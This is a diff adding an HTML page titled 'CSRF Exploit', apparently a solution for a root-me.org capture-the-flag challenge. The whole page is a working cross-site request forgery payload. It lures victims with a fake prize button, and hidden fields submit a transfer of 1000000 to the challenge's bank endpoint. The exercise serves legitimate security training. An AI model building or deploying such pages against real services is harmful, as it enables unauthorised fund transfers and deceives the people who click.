@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Exploit</title>
+</head>
+<body>
+    <h1>Special Offer!</h1>
+    <p>Click the button below to receive your prize:</p>
+    <form action="https://bankme-1.challenges.pro.root-me.org/transfer" method="POST">
+        <input type="hidden" name="recipient" value="aa">
+        <input type="hidden" name="amount" value="1000000"> <!-- Montant du transfert -->
+        <button type="submit">Claim your prize!</button>
+    </form>
+</body>
+</html>
